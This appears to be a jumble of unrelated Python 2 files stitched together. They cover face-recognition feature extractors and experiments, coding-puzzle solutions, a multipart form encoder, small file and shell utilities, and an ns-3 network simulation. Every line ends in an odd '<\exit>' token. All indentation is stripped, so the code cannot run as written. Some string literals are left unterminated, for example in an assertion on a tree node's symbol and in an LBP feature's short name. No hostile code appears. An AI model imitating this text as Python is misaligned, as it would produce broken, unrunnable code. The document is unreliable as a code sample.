cv2.waitKey(0)<\exit>
cv2.destroyAllWindows()<\exit>
return cv<\exit>
def _get_model(self, feature, classifier):<\exit>
return PredictableModel(feature=feature, classifier=classifier)<\exit>
def show_plot(self):<\exit>
self._drawer.show()<\exit>
def plot_roc(self, cv):<\exit>
self._drawer.plot_roc(cv)<\exit>
class FeaturesEnsembleExperiment(Experiment):<\exit>
def _get_model(self, features, classifier):<\exit>
return FeaturesEnsemblePredictableModel(features, classifier)<\exit>
def draw_roc(expr):<\exit>
cv = expr.experiment(Fisherfaces(14), threshold_up=1)<\exit>
expr.plot_roc(cv)<\exit>
cv = expr.experiment(PCA(50), threshold_up=1)<\exit>
expr.plot_roc(cv)<\exit>
cv = expr.experiment(SpatialHistogram(), dist_metric=HistogramIntersection(), threshold_up=1)<\exit>
expr.plot_roc(cv)<\exit>
expr.show_plot()<\exit>
def ensemble_lbp_fisher():<\exit>
features = [LbpFisher(ExtendedLBP(i)) for i in (3, 6, 10, 11, 14, 15, 19)]<\exit>
expr = FeaturesEnsembleExperiment()<\exit>
expr.experiment(features, debug=False)<\exit>
if __name__ == "__main__":<\exit>
expr = Experiment(froze_shuffle=True)<\exit>
class Solution:<\exit>
def evaluateExpression(self, expression):<\exit>
post = self.infix2postfix(expression)<\exit>
return self.eval_postfix(post)<\exit>
def infix2postfix(self, lst):<\exit>
stk = []<\exit>
post = []<\exit>
for elt in lst:<\exit>
if elt.isdigit():<\exit>
post.append(elt)<\exit>
else:<\exit>
if elt == "(":<\exit>
stk.append(elt)<\exit>
elif elt == ")":<\exit>
while stk and stk[-1] != "(":<\exit>
post.append(stk.pop())<\exit>
stk.pop()<\exit>
else:<\exit>
while stk and self.precedence(elt) <= self.precedence(stk[-1]):<\exit>
post.append(stk.pop())<\exit>
stk.append(elt)<\exit>
while stk:<\exit>
post.append(stk.pop())<\exit>
return post<\exit>
def eval_postfix(self, post):<\exit>
stk = []<\exit>
for elt in post:<\exit>
if elt.isdigit():<\exit>
stk.append(int(elt))<\exit>
else:<\exit>
b = stk.pop()<\exit>
a = stk.pop()<\exit>
if elt == "+":<\exit>
stk.append(a+b)<\exit>
elif elt == "-":<\exit>
stk.append(a-b)<\exit>
elif elt == "*":<\exit>
stk.append(a*b)<\exit>
else:<\exit>
stk.append(a/b)<\exit>
if stk:<\exit>
return stk[-1]<\exit>
return 0<\exit>
def precedence(self, a):<\exit>
if a in ("(", ")"):<\exit>
return 0<\exit>
if a in ("+", "-"):<\exit>
return 1<\exit>
if a in ("*", "/"):<\exit>
return 2<\exit>
return 3<\exit>
if __name__ == "__main__":<\exit>
t = [<\exit>
"2", "*", "6", "-", "(",<\exit>
"23", "+", "7", ")", "/",<\exit>
"(", "1", "+", "2", ")"<\exit>
]<\exit>
assert Solution().evaluateExpression(list("1+5")) == 6<\exit>
assert Solution().evaluateExpression(t)==2<\exit>
class ExpressionTreeNode:<\exit>
def __init__(self, symbol):<\exit>
self.symbol = symbol<\exit>
self.left, self.right = None, None<\exit>
class Solution:<\exit>
def build(self, expression):<\exit>
post = self.infix2postfix(expression)<\exit>
tree_node = self.postfix2tree(post)<\exit>
return tree_node<\exit>
def infix2postfix(self, expression):<\exit>
post = []<\exit>
op_stk = []<\exit>
for elt in expression:<\exit>
if elt.isdigit():<\exit>
post.append(elt)<\exit>
elif elt == "(":<\exit>
op_stk.append(elt)<\exit>
elif elt == ")":<\exit>
while op_stk and op_stk[-1] != "(":<\exit>
post.append(op_stk.pop())<\exit>
op_stk.pop()<\exit>
else:<\exit>
while op_stk and self.precedence(op_stk[-1]) >= self.precedence(<\exit>
elt):<\exit>
post.append(op_stk.pop())<\exit>
op_stk.append(elt)<\exit>
while op_stk:<\exit>
post.append(op_stk.pop())<\exit>
return post<\exit>
def postfix2tree(self, post):<\exit>
tree_stk = []<\exit>
for elt in post:<\exit>
if elt.isdigit():<\exit>
tree_stk.append(ExpressionTreeNode(elt))<\exit>
else:<\exit>
pi = ExpressionTreeNode(elt)<\exit>
pi.right = tree_stk.pop()<\exit>
pi.left = tree_stk.pop()<\exit>
tree_stk.append(pi)<\exit>
try:<\exit>
return tree_stk.pop()<\exit>
except IndexError:<\exit>
return None<\exit>
def precedence(self, elt):<\exit>
if elt in ("(", ")"):<\exit>
return 0<\exit>
if elt in ("+", "-"):<\exit>
return 1<\exit>
if elt in ("*", "/"):<\exit>
return 2<\exit>
return 3<\exit>
if __name__ == "__main__":<\exit>
tree_ndoe = Solution().build(["2", "*", "6", "-", "(", "23", "+", "7", ")", "/", "(", "1", "+", "2", ")"])<\exit>
assert tree_ndoe.symbol == "-<\exit>
import sys<\exit>
sys.path.append("../..")<\exit>
import cv2<\exit>
from facedet.detector import SkinFaceDetector<\exit>
import numpy as np<\exit>
import os<\exit>
def extract_faces(src_dir, dst_dir, detector, face_sz = (130,130)):<\exit>
if not os.path.exists(dst_dir):<\exit>
try:<\exit>
os.mkdir(dst_dir)<\exit>
except:<\exit>
raise OSError("Can't create destination directory (%s)!" % (dst_dir))<\exit>
for dirname, dirnames, filenames in os.walk(src_dir):<\exit>
for subdir in dirnames:<\exit>
src_subdir = os.path.join(dirname, subdir)<\exit>
dst_subdir = os.path.join(dst_dir,subdir)<\exit>
if not os.path.exists(dst_subdir):<\exit>
try:<\exit>
os.mkdir(dst_subdir)<\exit>
except:<\exit>
raise OSError("Can't create destination directory (%s)!" % (dst_dir))<\exit>
for filename in os.listdir(src_subdir):<\exit>
name, ext = os.path.splitext(filename)<\exit>
src_fn = os.path.join(src_subdir,filename)<\exit>
img = cv2.imread(src_fn)<\exit>
rects = detector.detect(img)<\exit>
for i,rect in enumerate(rects):<\exit>
x0,y0,x1,y1 = rect<\exit>
face = img[y0:y1,x0:x1]<\exit>
face = cv2.resize(face, face_sz, interpolation = cv2.INTER_CUBIC)<\exit>
print os.path.join(dst_subdir, "%s_%s_%d%s" % (subdir, name,i,ext))<\exit>
cv2.imwrite(os.path.join(dst_subdir, "%s_%s_%d%s" % (subdir, name,i,ext)), face)<\exit>
if __name__ == "__main__":<\exit>
if len(sys.argv) < 3:<\exit>
print "usage: python extract_faces.py <src_dir> <dst_dir>"<\exit>
sys.exit()<\exit>
src_dir = sys.argv[1]<\exit>
dst_dir = sys.argv[2]<\exit>
detector = SkinFaceDetector(threshold=0.3, cascade_fn="/home/philipp/projects/opencv2/OpenCV-2.3.1/data/haarcascades/haarcascade_frontalface_alt2.xml")<\exit>
extract_faces(src_dir=src_dir, dst_dir=dst_dir, detector=detector)<\exit>
import numpy as np<\exit>
class AbstractFeature(object):<\exit>
def compute(self, X, y):<\exit>
raise NotImplementedError("Every AbstractFeature must implement the compute method.")<\exit>
def extract(self, X):<\exit>
raise NotImplementedError("Every AbstractFeature must implement the extract method.")<\exit>
def save(self):<\exit>
raise NotImplementedError("Not implemented yet (TODO).")<\exit>
def load(self):<\exit>
raise NotImplementedError("Not implemented yet (TODO).")<\exit>
def __repr__(self):<\exit>
return self.short_name()<\exit>
def short_name(self):<\exit>
return self.__class__.__name__<\exit>
class Identity(AbstractFeature):<\exit>
def __init__(self):<\exit>
AbstractFeature.__init__(self)<\exit>
def compute(self, X, y):<\exit>
return X<\exit>
def extract(self, X):<\exit>
return X<\exit>
def __repr__(self):<\exit>
return "Identity"<\exit>
from facerec_py.facerec.util import asColumnMatrix<\exit>
from facerec_py.facerec.operators import ChainOperator, CombineOperator<\exit>
class PCA(AbstractFeature):<\exit>
def __init__(self, num_components=0):<\exit>
AbstractFeature.__init__(self)<\exit>
self._num_components = num_components<\exit>
self._total_energy = 0<\exit>
self._mean = None<\exit>
self._eigenvectors = None<\exit>
self._eigenvalues = None<\exit>
def compute(self, X, y):<\exit>
XC = asColumnMatrix(X)<\exit>
y = np.asarray(y)<\exit>
if self._num_components <= 0 or (self._num_components > XC.shape[1] - 1):<\exit>
self._num_components = XC.shape[1] - 1<\exit>
self._mean = XC.mean(axis=1).reshape(-1, 1)<\exit>
XC = XC - self._mean<\exit>
self._eigenvectors, self._eigenvalues, variances = np.linalg.svd(XC, full_matrices=False)<\exit>
self._eigenvalues = np.power(self._eigenvalues, 2) / XC.shape[1]<\exit>
self._total_energy = np.sum(self._eigenvalues)<\exit>
idx = np.argsort(-self._eigenvalues)<\exit>
self._eigenvalues, self._eigenvectors = self._eigenvalues[idx], self._eigenvectors[:, idx]<\exit>
self._eigenvectors = self._eigenvectors[:, :self._num_components].copy()<\exit>
self._eigenvalues = self._eigenvalues[:self._num_components].copy()<\exit>
features = []<\exit>
for x in X:<\exit>
xp = self.project(x.reshape(-1, 1))<\exit>
features.append(xp)<\exit>
return features<\exit>
def extract(self, X):<\exit>
X = np.asarray(X).reshape(-1, 1)<\exit>
return self.project(X)<\exit>
def project(self, X):<\exit>
X = X - self._mean<\exit>
return np.dot(self._eigenvectors.T, X)<\exit>
def reconstruct(self, X):<\exit>
X = np.dot(self._eigenvectors, X)<\exit>
return X + self._mean<\exit>
@property<\exit>
def num_components(self):<\exit>
return self._num_components<\exit>
@property<\exit>
def eigenvalues(self):<\exit>
return self._eigenvalues<\exit>
@property<\exit>
def eigenvectors(self):<\exit>
return self._eigenvectors<\exit>
@property<\exit>
def mean(self):<\exit>
return self._mean<\exit>
@property<\exit>
def energy_percentage(self):<\exit>
return np.sum(self._eigenvalues) / self._total_energy<\exit>
def __repr__(self):<\exit>
return "PCA (num_components=%d)" % self._num_components<\exit>
def short_name(self):<\exit>
return "PCA: %d" % self._num_components<\exit>
class LDA(AbstractFeature):<\exit>
def __init__(self, num_components=0):<\exit>
AbstractFeature.__init__(self)<\exit>
self._num_components = num_components<\exit>
self._eigenvalues = None<\exit>
self._eigenvectors = None<\exit>
def compute(self, X, y):<\exit>
XC = asColumnMatrix(X)<\exit>
y = np.asarray(y)<\exit>
d = XC.shape[0]<\exit>
c = len(np.unique(y))<\exit>
if self._num_components <= 0:<\exit>
self._num_components = c - 1<\exit>
elif self._num_components > (c - 1):<\exit>
self._num_components = c - 1<\exit>
mean_total = XC.mean(axis=1).reshape(-1, 1)<\exit>
Sw = np.zeros((d, d), dtype=np.float32)<\exit>
Sb = np.zeros((d, d), dtype=np.float32)<\exit>
for i in range(0, c):<\exit>
Xi = XC[:, np.where(y==i)[0]]<\exit>
mean_class = np.mean(Xi, axis=1).reshape(-1, 1)<\exit>
Sw = Sw + np.dot((Xi - mean_class), (Xi - mean_class).T)<\exit>
Sb = Sb + Xi.shape[1] * np.dot((mean_class - mean_total), (mean_class - mean_total).T)<\exit>
self._eigenvalues, self._eigenvectors = np.linalg.eig(np.linalg.inv(Sw) * Sb)<\exit>
idx = np.argsort(-self._eigenvalues.real)<\exit>
self._eigenvalues, self._eigenvectors = self._eigenvalues[idx], self._eigenvectors[:, idx]<\exit>
self._eigenvalues = np.array(self._eigenvalues[0:self._num_components].real, dtype=np.float32, copy=True)<\exit>
self._eigenvectors = np.matrix(self._eigenvectors[0:, 0:self._num_components].real, dtype=np.float32, copy=True)<\exit>
features = []<\exit>
for x in X:<\exit>
xp = self.project(x.reshape(-1, 1))<\exit>
features.append(xp)<\exit>
return features<\exit>
def project(self, X):<\exit>
return np.dot(self._eigenvectors.T, X)<\exit>
def reconstruct(self, X):<\exit>
return np.dot(self._eigenvectors, X)<\exit>
@property<\exit>
def num_components(self):<\exit>
return self._num_components<\exit>
@property<\exit>
def eigenvectors(self):<\exit>
return self._eigenvectors<\exit>
@property<\exit>
def eigenvalues(self):<\exit>
return self._eigenvalues<\exit>
def __repr__(self):<\exit>
return "LDA (num_components=%d)" % self._num_components<\exit>
class Fisherfaces(AbstractFeature):<\exit>
def __init__(self, num_components=0):<\exit>
AbstractFeature.__init__(self)<\exit>
self._num_components = num_components<\exit>
self._eigenvectors = None<\exit>
self._eigenvalues = None<\exit>
def compute(self, X, y):<\exit>
XC = asColumnMatrix(X)<\exit>
y = np.asarray(y)<\exit>
n = len(y)<\exit>
c = len(np.unique(y))<\exit>
pca = PCA(num_components=(n-c))<\exit>
lda = LDA(num_components=self._num_components)<\exit>
model = ChainOperator(pca, lda)<\exit>
model.compute(X, y)<\exit>
self._eigenvalues = lda.eigenvalues<\exit>
self._num_components = lda.num_components<\exit>
self._eigenvectors = np.dot(pca.eigenvectors, lda.eigenvectors)<\exit>
features = []<\exit>
for x in X:<\exit>
xp = self.project(x.reshape(-1, 1))<\exit>
features.append(xp)<\exit>
return features<\exit>
def extract(self, X):<\exit>
X = np.asarray(X).reshape(-1, 1)<\exit>
return self.project(X)<\exit>
def project(self, X):<\exit>
return np.dot(self._eigenvectors.T, X)<\exit>
def reconstruct(self, X):<\exit>
return np.dot(self._eigenvectors, X)<\exit>
@property<\exit>
def num_components(self):<\exit>
return self._num_components<\exit>
@property<\exit>
def eigenvalues(self):<\exit>
return self._eigenvalues<\exit>
@property<\exit>
def eigenvectors(self):<\exit>
return self._eigenvectors<\exit>
def __repr__(self):<\exit>
return "Fisherfaces (num_components=%s)" % self._num_components<\exit>
def short_name(self):<\exit>
return "Fisher: %d" % self._num_components<\exit>
from facerec_py.facerec.lbp import *<\exit>
class SpatialHistogram(AbstractFeature):<\exit>
def __init__(self, lbp_operator=ExtendedLBP(), sz=(8, 8)):<\exit>
AbstractFeature.__init__(self)<\exit>
if not isinstance(lbp_operator, LocalDescriptor):<\exit>
raise TypeError("Only an operator of type facerec.lbp.LocalDescriptor is a valid lbp_operator.")<\exit>
self.lbp_operator = lbp_operator<\exit>
self.sz = sz<\exit>
self.X = None<\exit>
self.y = None<\exit>
def compute(self, X, y):<\exit>
self.X = X<\exit>
self.y = y<\exit>
features = []<\exit>
for x in X:<\exit>
x = np.asarray(x)<\exit>
h = self.spatially_enhanced_histogram(x)<\exit>
features.append(h)<\exit>
return features<\exit>
def extract(self, X):<\exit>
X = np.asarray(X)<\exit>
return self.spatially_enhanced_histogram(X)<\exit>
def spatially_enhanced_histogram(self, X):<\exit>
L = self.lbp_operator(X)<\exit>
lbp_height, lbp_width = L.shape<\exit>
grid_rows, grid_cols = self.sz<\exit>
py = int(np.floor(lbp_height/grid_rows))<\exit>
px = int(np.floor(lbp_width/grid_cols))<\exit>
E = []<\exit>
for row in range(0, grid_rows):<\exit>
for col in range(0, grid_cols):<\exit>
C = L[row*py:(row+1)*py, col*px:(col+1)*px]<\exit>
H = self._get_histogram(C, row, col)<\exit>
E.extend(H)<\exit>
return np.asarray(E)<\exit>
def _get_histogram(self, C, row, col, normed=True):<\exit>
H = np.histogram(C,<\exit>
bins=2 ** self.lbp_operator.neighbors,<\exit>
range=(0, 2 ** self.lbp_operator.neighbors),<\exit>
weights=None,<\exit>
normed=normed<\exit>
)[0]<\exit>
return H<\exit>
def __repr__(self):<\exit>
return "SpatialHistogram LBP (operator=%s, grid=%s)" % (repr(self.lbp_operator), str(self.sz))<\exit>
def short_name(self):<\exit>
return "LBP Histogram<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
A, B, N = cipher<\exit>
a, b = A, B<\exit>
cnt = 1<\exit>
while cnt < N:<\exit>
cnt += 1<\exit>
a, b = b, b * b + a<\exit>
return a<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution:<\exit>
def fibonacci(self, n):<\exit>
f = lambda n: reduce(lambda x, n: [x[1], x[0]+x[1]], range(n), [0, 1])[0]<\exit>
return f(n-1)<\exit>
lst = []<\exit>
for i in xrange(1, 33+1):<\exit>
lst.append("data/%d.tsv"%(i))<\exit>
print ",".join(lst)<\exit>
import codecs<\exit>
import mimetypes<\exit>
from uuid import uuid4<\exit>
from io import BytesIO<\exit>
from .packages import six<\exit>
from .packages.six import b<\exit>
writer = codecs.lookup('utf-8')[3]<\exit>
def choose_boundary():<\exit>
return uuid4().hex<\exit>
def get_content_type(filename):<\exit>
return mimetypes.guess_type(filename)[0] or 'application/octet-stream'<\exit>
def iter_fields(fields):<\exit>
if isinstance(fields, dict):<\exit>
return ((k, v) for k, v in six.iteritems(fields))<\exit>
return ((k, v) for k, v in fields)<\exit>
def encode_multipart_formdata(fields, boundary=None):<\exit>
body = BytesIO()<\exit>
if boundary is None:<\exit>
boundary = choose_boundary()<\exit>
for fieldname, value in iter_fields(fields):<\exit>
body.write(b('--%s\r\n' % (boundary)))<\exit>
if isinstance(value, tuple):<\exit>
if len(value) == 3:<\exit>
filename, data, content_type = value<\exit>
else:<\exit>
filename, data = value<\exit>
content_type = get_content_type(filename)<\exit>
writer(body).write('Content-Disposition: form-data; name="%s"; '<\exit>
'filename="%s"\r\n' % (fieldname, filename))<\exit>
body.write(b('Content-Type: %s\r\n\r\n' %<\exit>
(content_type,)))<\exit>
else:<\exit>
data = value<\exit>
writer(body).write('Content-Disposition: form-data; name="%s"\r\n'<\exit>
% (fieldname))<\exit>
body.write(b'\r\n')<\exit>
if isinstance(data, int):<\exit>
data = str(data)<\exit>
if isinstance(data, six.text_type):<\exit>
writer(body).write(data)<\exit>
else:<\exit>
body.write(data)<\exit>
body.write(b'\r\n')<\exit>
body.write(b('--%s--\r\n' % (boundary)))<\exit>
content_type = b('multipart/form-data; boundary=%s' % boundary)<\exit>
return body.getvalue(), content_type<\exit>
import os<\exit>
import re<\exit>
class FileUtils(object):<\exit>
@classmethod<\exit>
def rename(cls):<\exit>
find = r".+(?P<time>\d{4}-\d{2}-\d{2}-\d{2}-\d{2}-\d{2}\.png$)"<\exit>
dir = os.path.dirname(os.path.realpath(__file__))<\exit>
for r, dirs, fs in os.walk(dir):<\exit>
for f in fs:<\exit>
m = re.search(find, f)<\exit>
if m:<\exit>
f1 = m.group("time")<\exit>
os.rename(f, f1)<\exit>
print "%s -> %s" % (f, f1)<\exit>
class CmdUtils(object):<\exit>
@classmethod<\exit>
def execute(cls, cmd):<\exit>
os.system(cmd)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
num = int(cipher)<\exit>
cnt = 0<\exit>
for char in cipher:<\exit>
digit = int(char)<\exit>
if digit == 0: continue<\exit>
if num % digit == 0:<\exit>
cnt += 1<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
A = cipher<\exit>
L = [-1 for _ in A]<\exit>
for i in xrange(1, len(A)):<\exit>
idx = i - 1<\exit>
while idx != -1:<\exit>
if A[idx] > A[i]:<\exit>
L[i] = idx<\exit>
break<\exit>
idx = L[idx]<\exit>
R = [-1 for _ in A]<\exit>
for i in xrange(len(A) - 2, -1, -1):<\exit>
idx = i + 1<\exit>
while idx != -1:<\exit>
if A[idx] > A[i]:<\exit>
R[i] = idx<\exit>
break<\exit>
idx = R[idx]<\exit>
maxa = -1<\exit>
for i in xrange(len(A)):<\exit>
left = L[i] + 1<\exit>
right = R[i] + 1<\exit>
maxa = max(maxa, left * right)<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
N = int(f.readline().strip())<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import heapq<\exit>
class DualHeap(object):<\exit>
def __init__(self):<\exit>
self.min_h = []<\exit>
self.max_h = []<\exit>
def insert(self, num):<\exit>
if not self.min_h or num > self.min_h[0]:<\exit>
heapq.heappush(self.min_h, num)<\exit>
else:<\exit>
heapq.heappush(self.max_h, -num)<\exit>
self.balance()<\exit>
def balance(self):<\exit>
l1 = len(self.min_h)<\exit>
l2 = len(self.max_h)<\exit>
if l1 - l2 > 1:<\exit>
heapq.heappush(self.max_h, -heapq.heappop(self.min_h))<\exit>
self.balance()<\exit>
elif l2 - l1 > 1:<\exit>
heapq.heappush(self.min_h, -heapq.heappop(self.max_h))<\exit>
self.balance()<\exit>
return<\exit>
def get_median(self):<\exit>
l1 = len(self.min_h)<\exit>
l2 = len(self.max_h)<\exit>
m = (l1 + l2 - 1) / 2<\exit>
if (l1 + l2) % 2 == 1:<\exit>
if m == l2 - 1:<\exit>
return -self.max_h[0]<\exit>
elif m == l2:<\exit>
return self.min_h[0]<\exit>
raise Exception("not balanced")<\exit>
else:<\exit>
return (-self.max_h[0] + self.min_h[0]) / 2.0<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.dh = DualHeap()<\exit>
def solve(self, cipher):<\exit>
self.dh.insert(cipher)<\exit>
return self.dh.get_median()<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = int(f.readline().strip())<\exit>
s = "%.1f\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import sys<\exit>
class Solution:<\exit>
def findPeakII(self, A):<\exit>
minint = -sys.maxint-1<\exit>
left = 0<\exit>
right = len(A[0])<\exit>
top = 0<\exit>
bottom = len(A)<\exit>
while left < right and top < bottom:<\exit>
if right-left > bottom-top:<\exit>
mid = (right+left)/2<\exit>
l_max = minint<\exit>
r_max = minint<\exit>
c_max = minint<\exit>
c_i, c_j = -1, -1<\exit>
for i in xrange(top, bottom):<\exit>
l_max = max(l_max, A[i][mid-1])<\exit>
r_max = max(r_max, A[i][mid+1])<\exit>
c_max = max(c_max, A[i][mid])<\exit>
if c_max == A[i][mid]:<\exit>
c_i, c_j = i, mid<\exit>
if l_max > c_max and l_max > r_max:<\exit>
right = mid<\exit>
elif r_max > c_max and r_max > l_max:<\exit>
left = mid+1<\exit>
else:<\exit>
return [c_i, c_j]<\exit>
else:<\exit>
mid = (top+bottom)/2<\exit>
u_max = minint<\exit>
d_max = minint<\exit>
c_max = minint<\exit>
c_i, c_j = -1, -1<\exit>
for j in xrange(left, right):<\exit>
u_max = max(u_max, A[mid-1][j])<\exit>
d_max = max(d_max, A[mid+1][j])<\exit>
c_max = max(c_max, A[mid][j])<\exit>
if c_max == A[mid][j]:<\exit>
c_i, c_j = mid, j<\exit>
if u_max > c_max and u_max > d_max:<\exit>
bottom = mid<\exit>
elif d_max > c_max and d_max > u_max:<\exit>
top = mid+1<\exit>
else:<\exit>
return [c_i, c_j]<\exit>
return [-1, -1]<\exit>
if __name__ == "__main__":<\exit>
A = [<\exit>
[1,  2,  3,  4,   5, 6],<\exit>
[14, 15, 16, 17, 18, 8],<\exit>
[12, 13, 11, 10,  9, 7]<\exit>
]<\exit>
print Solution().findPeakII(A)<\exit>
class Solution:<\exit>
def findPeak(self, A):<\exit>
n = len(A)<\exit>
l = 0<\exit>
h = n<\exit>
while l < h:<\exit>
m = (l+h)/2<\exit>
if A[m-1] < A[m] > A[m+1]:<\exit>
return m<\exit>
elif A[m+1] > A[m]:<\exit>
l = m+1<\exit>
else:<\exit>
h = m<\exit>
raise Exception<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findPeak([1, 2, 1, 3, 4, 5, 7, 6]) in (1, 6)<\exit>
class UndirectedGraphNode:<\exit>
def __init__(self, x):<\exit>
self.label = x<\exit>
self.neighbors = []<\exit>
class Solution:<\exit>
def connectedSet(self, nodes):<\exit>
rets = []<\exit>
visisted = set()<\exit>
for node in nodes:<\exit>
if node not in visisted:<\exit>
ret = []<\exit>
self.dfs(node, visisted, ret)<\exit>
ret.sort()<\exit>
rets.append(ret)<\exit>
return rets<\exit>
def dfs(self, node, visited, ret):<\exit>
ret.append(node.label)<\exit>
visited.add(node)<\exit>
for nei in node.neighbors:<\exit>
if nei not in visited:<\exit>
self.dfs(nei, visited, ret)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, A = cipher<\exit>
if N % 2 == 1:<\exit>
return self.find_kth(A, 0, N - 1, (N - 1) / 2)<\exit>
else:<\exit>
raise IndexError<\exit>
def find_kth(self, A, i, j, k):<\exit>
p = self.partition(A, i, j)<\exit>
if p == k:<\exit>
return A[p]<\exit>
if p > k:<\exit>
return self.find_kth(A, i, p - 1, k)<\exit>
else:<\exit>
return self.find_kth(A, p + 1, j, k)<\exit>
def partition(self, A, i, j):<\exit>
if i > j:<\exit>
raise IndexError<\exit>
if i == j:<\exit>
return i<\exit>
p = i<\exit>
ptr_smaller = p<\exit>
for ptr in xrange(p + 1, j + 1):<\exit>
if A[ptr] < A[p]:<\exit>
ptr_smaller += 1<\exit>
A[ptr], A[ptr_smaller] = A[ptr_smaller], A[ptr]<\exit>
A[p], A[ptr_smaller] = A[ptr_smaller], A[p]<\exit>
return ptr_smaller<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
N = int(f.readline().strip())<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def findMissing(self, nums):<\exit>
nth = -1<\exit>
n = len(nums)<\exit>
i = 0<\exit>
while i < n:<\exit>
if nums[i] == n:<\exit>
nth = nums[i]<\exit>
i += 1<\exit>
elif nums[i] != i:<\exit>
nums[nums[i]], nums[i] = nums[i], nums[nums[i]]<\exit>
else:<\exit>
i += 1<\exit>
if nth == -1:<\exit>
return n<\exit>
else:<\exit>
return nums.index(nth)<\exit>
if __name__ == "__main__":<\exit>
print Solution().findMissing([9,8,7,6,2,0,1,5,4])<\exit>
class DirectedGraphNode:<\exit>
def __init__(self, x):<\exit>
self.label = x<\exit>
self.neighbors = []<\exit>
def __repr__(self):<\exit>
return repr(self.x)<\exit>
from collections import defaultdict<\exit>
class UnionFind(object):<\exit>
def __init__(self):<\exit>
self.pi = {}<\exit>
self.sz = {}<\exit>
def add(self, item):<\exit>
if item not in self.pi:<\exit>
self.pi[item] = item<\exit>
self.sz[item] = 1<\exit>
def union(self, a, b):<\exit>
pi1 = self._pi(a)<\exit>
pi2 = self._pi(b)<\exit>
if pi1 != pi2:<\exit>
if self.sz[pi1] > self.sz[pi2]:<\exit>
pi1, pi2 = pi2, pi1<\exit>
self.pi[pi1] = pi2<\exit>
self.sz[pi2] += self.sz[pi1]<\exit>
del self.sz[pi1]<\exit>
def _pi(self, item):<\exit>
pi = self.pi[item]<\exit>
if item != pi:<\exit>
self.pi[item] = self._pi(pi)<\exit>
return self.pi[item]<\exit>
def compress(self):<\exit>
for item in self.pi.keys():<\exit>
self.pi[item] = self._pi(item)<\exit>
def count(self):<\exit>
return len(self.sz)<\exit>
class Solution:<\exit>
def connectedSet2(self, nodes):<\exit>
uf = UnionFind()<\exit>
for node in nodes:<\exit>
uf.add(node.label)<\exit>
for nei in node.neighbors:<\exit>
uf.add(nei.label)<\exit>
uf.union(node.label, nei.label)<\exit>
uf.compress()<\exit>
ret = defaultdict(list)<\exit>
for item, pi in uf.pi.items():<\exit>
ret[pi].append(item)<\exit>
for v in ret.values():<\exit>
v.sort()<\exit>
return ret.values()<\exit>
if __name__ == "__main__":<\exit>
items = {i: DirectedGraphNode(i) for i in "ABCDEF"}<\exit>
items["A"].neighbors.append(items["B"])<\exit>
items["A"].neighbors.append(items["D"])<\exit>
items["B"].neighbors.append(items["D"])<\exit>
items["C"].neighbors.append(items["E"])<\exit>
items["F"].neighbors.append(items["E"])<\exit>
assert Solution().connectedSet2(items.values()) == [['A', 'B', 'D'], ['C', 'E', 'F']]<\exit>
class VersionControl:<\exit>
@classmethod<\exit>
def isBadVersion(cls, id):<\exit>
return True<\exit>
class Solution:<\exit>
def findFirstBadVersion(self, n):<\exit>
l = 1<\exit>
h = n+1<\exit>
while l < h:<\exit>
m = (l+h)/2<\exit>
if not VersionControl.isBadVersion(m):<\exit>
l = m+1<\exit>
else:<\exit>
h = m<\exit>
return l<\exit>
class Solution(object):<\exit>
def firstMissingPositive(self, A):<\exit>
n = len(A)<\exit>
i = 0<\exit>
while i < n:<\exit>
v = A[i]<\exit>
if v <= 0 or v > n:<\exit>
i += 1<\exit>
elif A[v-1] != v:<\exit>
A[v-1], A[i] = v, A[v-1]<\exit>
else:<\exit>
i += 1<\exit>
for i in xrange(n):<\exit>
if A[i] != i+1:<\exit>
return i+1<\exit>
return n+1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().firstMissingPositive([3, 4, -1, 1]) == 2<\exit>
import ns.applications<\exit>
import ns.core<\exit>
import ns.internet<\exit>
import ns.network<\exit>
import ns.point_to_point<\exit>
ns.core.LogComponentEnable("UdpEchoClientApplication", ns.core.LOG_LEVEL_INFO)<\exit>
ns.core.LogComponentEnable("UdpEchoServerApplication", ns.core.LOG_LEVEL_INFO)<\exit>
nodes = ns.network.NodeContainer()<\exit>
nodes.Create(2)<\exit>
pointToPoint = ns.point_to_point.PointToPointHelper()<\exit>
pointToPoint.SetDeviceAttribute("DataRate", ns.core.StringValue("5Mbps"))<\exit>
pointToPoint.SetChannelAttribute("Delay", ns.core.StringValue("2ms"))<\exit>
devices = pointToPoint.Install(nodes)<\exit>
stack = ns.internet.InternetStackHelper()<\exit>
stack.Install(nodes)<\exit>
address = ns.internet.Ipv4AddressHelper()<\exit>
address.SetBase(ns.network.Ipv4Address("10.1.1.0"), ns.network.Ipv4Mask("255.255.255.0"))<\exit>
interfaces = address.Assign (devices);<\exit>
echoServer = ns.applications.UdpEchoServerHelper(9)<\exit>
serverApps = echoServer.Install(nodes.Get(1))<\exit>
serverApps.Start(ns.core.Seconds(1.0))<\exit>
serverApps.Stop(ns.core.Seconds(10.0))<\exit>
